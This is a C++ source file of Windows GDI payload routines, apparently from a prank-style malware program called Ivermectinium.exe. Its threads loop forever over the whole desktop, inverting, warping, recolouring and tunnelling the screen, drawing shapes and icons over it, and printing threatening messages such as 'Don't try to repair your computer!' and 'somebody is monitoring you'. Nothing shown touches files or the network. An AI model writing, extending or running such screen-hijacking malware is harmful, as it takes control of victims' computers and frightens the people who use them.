DWORD WINAPI tanwaves1(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = tan(angle) * 50;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
			angle += PI / 60;
			DeleteObject(&a); DeleteObject(&i);
		}
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI sines1(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 20;
			BitBlt(hdc, i, 0, 1, sh, hdc, i, a, SRCCOPY);
			angle += PI / 40;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI patblt1(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1)
	{
		desk = GetDC(0);
		SelectObject(desk, CreateSolidBrush(RndRGB));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI shader1(LPVOID lpParam) {
    int i = 0; RGBQUAD rgbquadCopy; HSL hslcolor;
    while (1)
    {
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmpi = { 0 };

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = x * h + y;
                int fx = (int)((i ^ 3) + (i * 6) * cbrt(x * i ^ i * y + x ^ i + y + i ^ i * x & y ^ i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
                hslcolor.s = 2.f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hcdc, hBrush);
        PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteObject(hBrush);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(100);
    }
    return 0;
}
DWORD WINAPI shader2(LPVOID lpvd)
{
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (x + y) & i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI idk(LPVOID lpParam)//credits to N17Pro3426
{
	int centerX = 600;
	int centerY = 400;
	int radius = 400;
	float angle = 0;
	while (true)
	{
		HDC hdc = GetDC(0);
		int x = centerX + static_cast<int>(radius * cos(angle * PI / 180));
		int y = centerY + static_cast<int>(radius * sin(angle * PI / 180));
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		RoundRect(hdc, x - 40, y - 40, x + 40, y + 40, x / 2, y / 2);
		angle += 1;
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	};
}
DWORD WINAPI bitblt1(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;)
	{
		BitBlt(hdc, -2, -2, w / 2, h / 2, hdc, 0, 0, SRCINVERT);
		BitBlt(hdc, (w / 2) + 2, -2, w / 2, h / 2, hdc, w / 2, 0, SRCINVERT);
		BitBlt(hdc, -2, (h / 2) + 2, w / 2, h / 2, hdc, 0, h / 2, SRCINVERT);
		BitBlt(hdc, (w / 2) + 2, (h / 2) + 2, w / 2, h / 2, hdc, w / 2, h / 2, SRCINVERT);
		Sleep(50);
	}
}
DWORD WINAPI stretchblt1(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		StretchBlt(hdc, 10, 10, (w / 2) - 20, (h / 2) - 20, hdc, 0, 0, w / 2, h / 2, SRCCOPY);
		StretchBlt(hdc, (w / 2) + 10, 10, (w / 2) - 20, (h / 2) - 20, hdc, w / 2, 0, w / 2, h / 2, SRCCOPY);
		StretchBlt(hdc, 10, (h / 2) + 10, (w / 2) - 20, (h / 2) - 20, hdc, 0, h / 2, w / 2, h / 2, SRCCOPY);
		StretchBlt(hdc, (w / 2) + 10, (h / 2) + 10, (w / 2) - 20, (h / 2) - 20, hdc, w / 2, h / 2, w / 2, h / 2, SRCCOPY);
		Sleep(100);
	}
}
DWORD WINAPI bitblt2(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		BitBlt(hdc, 0, 0, w / 2, h / 2, hdc, 0, 0, NOTSRCCOPY);
		BitBlt(hdc, w / 2, h / 2, w / 2, h / 2, hdc, w / 2, h / 2, NOTSRCCOPY);
		Sleep(1000);
	}
}
DWORD WINAPI patblt2(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, w / 2, 0, w / 2, h / 2, PATINVERT);
		PatBlt(hdc, 0, h / 2, w / 2, h / 2, PATINVERT);
		PatBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, DSTINVERT);
		Sleep(100);
	}
}
DWORD WINAPI plgblt1(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		POINT pos[3];
		pos[0].x = 10, pos[0].y = -30;
		pos[1].x = w + 10, pos[1].y = 30;
		pos[2].x = -40, pos[2].y = h - 30;
		PlgBlt(hdc, pos, hdc, 0, 0, w, h, 0, 0, 0);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(200);
		}
	return 0;
}
DWORD WINAPI polygonz(LPVOID lpParam) {//by N17Pro3426, but i modified it
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HPEN hPen = CreatePen(PS_SOLID, 2, Hue(239));
		HPEN hOldPen = SelectPen(hdc, hPen);

		HBRUSH hBrush = CreateSolidBrush(Hue(239));
		HBRUSH hOldBrush = SelectBrush(hdc, hBrush);

		POINT vertices[] = { {x + (rand() % 200), y + (rand() % 200)}, {x + 180, y + 50}, {x + 180, y + 20} , {x + 230, x + 70} , {x + (rand() % 200), y + (rand() % 200)} , {x + 180, y + 90} , {x + 20, y + 90} };
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));

		SelectBrush(hdc, hOldBrush);
		DeleteObject(hBrush);

		SelectPen(hdc, hOldPen);
		DeleteObject(hPen);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(1);
		//DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	PRGBTRIPLE rgbtriple; int xxx = 0;
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 40, w, h, 1, 24 };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w, t = (x | y);
			rgbtriple[i].rgbtRed += t + x + xxx;
			rgbtriple[i].rgbtGreen += t + i + xxx;
			rgbtriple[i].rgbtBlue += t + y + xxx;
		}
		for (int y = 0; y < h; y++) {
			StretchBlt(hcdc, -2 + rand() % 5, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1); xxx += 2;
	}
	return 0;
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (x = y) * RGB(GetRValue(Hue(256)), GetGValue(Hue(256)), GetBValue(Hue(256)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload9_num1(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		int a = rand() % 200;
		int x = rand() % w;
		int y = rand() % h;
		HPEN hPen = CreatePen(PS_SOLID, a / 10, RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(hdc, hPen);
		Arc(hdc, x - (a * (2 + genhaoeight)), y - (a * (2 + genhaoeight)), x + (a * (genhaoeight - 2)), y + (a * (genhaoeight - 2)), x - (a * 4), y, x, y);
		Arc(hdc, x - (a * 2 * genhaoeight), y - (a * genhaoeight), x, y + (a * genhaoeight), x, y, x - (a * genhaoeight), y - (a * genhaoeight));
		Arc(hdc, x - (a * 2 * genhaoeight), y - (a * genhaoeight), x, y + (a * genhaoeight), x - (a * genhaoeight), y + (a * genhaoeight), x, y);
		Arc(hdc, x - (a * (2 + genhaoeight)), y - (a * (2 + genhaoeight)), x + (a * (genhaoeight - 2)), y + (a * (genhaoeight - 2)), x, y, x, y - (a * 4));
		Arc(hdc, x - (a * (2 + genhaoeight)), y - (a * (genhaoeight - 2)), x + (a * (genhaoeight - 2)), y + (a * (2 + genhaoeight)), x, y + (a * 4), x, y);
		Arc(hdc, x - (a * genhaoeight), y - (a * 2 * genhaoeight), x + (a * genhaoeight), y, x, y, x + (a * genhaoeight), y - (a * genhaoeight));
		Arc(hdc, x - (a * genhaoeight), y, x + (a * genhaoeight), y + (a * 2 * genhaoeight), x + (a * genhaoeight), y + (a * genhaoeight), x, y);
		Arc(hdc, x - (a * (genhaoeight - 2)), y - (a * (2 + genhaoeight)), x + (a * (2 + genhaoeight)), y + (a * (genhaoeight - 2)), x, y, x + (a * 4), y);
		Arc(hdc, x - (a * (genhaoeight - 2)), y - (a * (genhaoeight - 2)), x + (a * (2 + genhaoeight)), y + (a * (2 + genhaoeight)), x + (a * 4), y, x, y);
		Arc(hdc, x, y - (a * genhaoeight), x + (a * (2 + genhaoeight)), y + (a * genhaoeight), x, y, x + (a * genhaoeight), y + (a * genhaoeight));
		Arc(hdc, x, y - (a * genhaoeight), x + (a * (2 + genhaoeight)), y + (a * genhaoeight), x + (a * genhaoeight), y - (a * genhaoeight), x, y);
		Arc(hdc, x - (a * (genhaoeight - 2)), y - (a * (genhaoeight - 2)), x + (a * (2 + genhaoeight)), y + (a * (2 + genhaoeight)), x, y, x, y + (a * 4));
		Arc(hdc, x - (a * (genhaoeight - 2)), y - (a * (2 + genhaoeight)), x + (a * (2 + genhaoeight)), y + (a * (genhaoeight - 2)), x, y - (a * 4), x, y);
		Arc(hdc, x - (a * genhaoeight), y, x + (a * genhaoeight), y + (a * 2 * genhaoeight), x, y, x - (a + genhaoeight), y + (a * genhaoeight));
		Arc(hdc, x - (a * genhaoeight), y - (a * 2 * genhaoeight), x + (a * genhaoeight), y, x - (a * genhaoeight), y - (a * genhaoeight), x, y);
		Arc(hdc, x - (a * (2 + genhaoeight)), y - (a * (genhaoeight - 2)), x + (a * (genhaoeight - 2)), y + (a * (2 + genhaoeight)), x, y, x - (a * 4), y);
		Sleep(100);
		DeleteObject(hPen);
	}
}
DWORD WINAPI payload9_num2(LPVOID lpvd)
{
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (1)
	{
		HDC hdc = GetDC(0);
		LPCSTR text = "Ivermectinium.exe by LambdaTechnology";
		LPCSTR text1 = "Don't try to repair your computer!";
		LPCSTR text2 = "There is nothing you want here, give up, because there's only hopelessness!";
		LPCSTR text3 = "You can't do anything, because somebody is monitoring you";
		LPCSTR text4 = "This matter has worsened because of you, see what exactly you have done";
		LPCSTR text5 = "Why are you so stupid like an idiot, making such a big mistake?";
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text5));
		ReleaseDC(0, hdc);
		Sleep(5);
	}
}
DWORD WINAPI payload9_num3(LPVOID lpParam) {
	HDC hdc = GetWindowDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		POINT point[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
		BYTE bbyyttee[3] = { PT_MOVETO ,PT_LINETO ,PT_BEZIERTO };
		INT iinntt[7] = { 2,3,4,5,6,7,8 };
		DWORD ddwwoorrdd[7] = { 2,3,4,5,6,7,8 };
		BOOL Function[16] = {
			AngleArc(hdc,rand() % w,rand() % h,rand() % ((w + h) / 2),rand() % 360,rand() % 360),
			Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h) ,
			ArcTo(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h) ,
			Chord(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
			Ellipse(hdc,rand() % w,rand() % h,rand() % w,rand() % h) ,
			LineTo(hdc,rand() % w,rand() % h),
			Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h),
			PolyBezier(hdc,point,rand() % 8),
			PolyBezierTo(hdc,point,rand() % 8),
			PolyDraw(hdc,point,bbyyttee,rand() % 8),
			Polygon(hdc,point,rand() % 8),
			Polyline(hdc,point,rand() % 8),
			PolylineTo(hdc,point,rand() % 8),
			PolyPolygon(hdc,point,iinntt,rand() % 8),
			PolyPolyline(hdc,point,ddwwoorrdd,rand() % 8),
			Rectangle(hdc,rand() % w,rand() % h,rand() % w,rand() % h),
		};
		SelectObject(hdc, CreatePen(PS_SOLID, rand() % 9, RGB(rand() % 256, rand() % 256, rand() % 256)));
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		Function[rand() % 16];
		DeleteObject;
		//ReleaseDC(NULL, hdc);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI payload9_num4(LPVOID lpParam) {
	HDC hdc;
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int rr[4] = { 0x3900, 0x4a00,0x2500,0x0 }, gg[4] = { 0xc500,0xff00,0x8000,0xc400 }, bb[4] = { 0xbb00,0xf200,0x7900,0xb700 }, a = rand() % 4, b = rand() % 4;
		TRIVERTEX vtx[2];
		vtx[0].x = rand() % w; vtx[0].y = rand() % h;
		vtx[1].x = rand() % w; vtx[1].y = rand() % h;
		vtx[0].Red = rr[a]; vtx[0].Green = gg[a]; vtx[0].Blue = bb[a]; vtx[0].Alpha = 0xff00;
		vtx[1].Red = rr[b]; vtx[1].Green = gg[b]; vtx[1].Blue = bb[b]; vtx[1].Alpha = 0xff00;
		GRADIENT_RECT rc;
		rc.UpperLeft = 0; rc.LowerRight = 1;
		DWORD mode[4] = { GRADIENT_FILL_RECT_H,GRADIENT_FILL_RECT_V,GRADIENT_FILL_TRIANGLE, GRADIENT_FILL_OP_FLAG };
		HRGN hrgn = CreateEllipticRgn(vtx[0].x, vtx[0].y, vtx[1].x, vtx[1].y);
		SelectClipRgn(hdc, hrgn);
		GradientFill(hdc, vtx, 4, &rc, 1, mode[rand() % 4]);
		DeleteObject(hrgn);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI payload9_num5(LPVOID lpParam) {
	HICON shifang; int size = 0;
	srand(time(NULL));
	while (true) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		shifang = LoadCursor(0, IDC_APPSTARTING); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_ARROW); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_CROSS); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_HELP); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_IBEAM); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_NO); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_SIZEALL); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_SIZENESW); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_SIZENS); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_SIZENWSE); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_SIZEWE); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_UPARROW); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_WAIT); size = 32 + rand() % 118;
		MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
		Sleep(20);
	}
}
DWORD WINAPI payload9_num6(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	for (;;) {
		for (int x = 0; x <= w; x += 64 * wdpi / 96) {
			for (int y = 0; y <= h; y += 64 * hdpi / 96) {
				hdc = GetDC(0);
				SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
				BitBlt(hdc, x, y, 64 * hdpi / 96, 64 * hdpi / 96, hdc, x, y, PATINVERT);
				Sleep(20);
			}
		}
	}
}
DWORD WINAPI payload9_num7(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	for (;;) {
		for (int y = 0; y <= h; y += 64 * hdpi / 96) {
			for (int x = 0; x <= w; x += 64 * wdpi / 96) {
				HRGN hrgn = CreateEllipticRgn(x, y, x + 64 * wdpi / 96, y + 64 * wdpi / 96);
				SelectClipRgn(hdc, hrgn);
				BitBlt(hdc, x, y, 64 * hdpi / 96, 64 * hdpi / 96, hdc, x, y, NOTSRCCOPY);
				Sleep(20);
			}
		}
	}
}
DWORD WINAPI payload9_num8(LPVOID lpParam) {
	int status = 3;
	int icnNum = 32516;
	POINT p;
	p.x = 0, p.y = 0;
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		DrawIcon(hdc, p.x, p.y, LoadIcon(NULL, MAKEINTRESOURCE(icnNum)));
		switch (status) {
		case 0: //�I
			icnNum = 32513;
			p.x -= 20;
			p.y -= 20;
			if (p.x < 0 || p.y < 0) {
				if (p.x < 0) {
					status = 1;
				}
				if (p.y < 0) {
					status = 2;
				}
			}
			break;
		case 1: //�J
			icnNum = 32514;
			p.x += 20;
			p.y -= 20;
			if (p.x >= w - 20 || p.y < 0) {
				if (p.x >= w - 20) {
					status = 0;
				}
				if (p.y < 0) {
					status = 3;
				}
			}
			break;
		case 2: //�L
			icnNum = 32515;
			p.x -= 20;
			p.y += 20;
			if (p.x < 0 || p.y >= h - 20) {
				if (p.x < 0) {
					status = 3;
				}
				if (p.y >= h - 20) {
					status = 0;
				}
			}
			break;
		case 3: //�K
			icnNum = 32516;
			if (p.x >= w - 20 && p.y >= h - 20) {
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				return 0;
			}
			p.x += 20;
			p.y += 20;
			if (p.x >= w - 20 || p.y >= h - 20) {
				if (p.x >= w - 20) {
					status = 2;
				}
				if (p.y >= h - 20) {
					status = 1;
				}
			}
			break;
		}
		Sleep(1);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	return 0;
}
DWORD WINAPI payload9_num9(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	int cx, cy, sgn;
	sgn = 0;
	while (true)
	{
		HDC hdc = GetDC(NULL);
		for (cy = 0; cy < h; ) {
			for (cx = 0; cx < w; ) {
				DrawIcon(hdc, cx, cy, LoadIcon(NULL, MAKEINTRESOURCE(32512 + sgn)));
				cx += 20;
				Sleep(1);
			}
			cy += 20;
			if (sgn >= 6) {
				sgn = 0;
			}
			else {
				sgn++;
			}
		}
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	return 0;
}
DWORD WINAPI shader5(LPVOID lpvd) { 
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = ((x + (10 * i)) ^ y) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI super_colour_change(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			data[i].rgb = (data[i].rgb * 2) % (RGB(255, 255, 255));
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI just_a_tunnel(LPVOID lpvd)
{
	while (true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		StretchBlt(hdc, 20, 20, w - 10, h - 20, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(50);
	}
	return 0;
}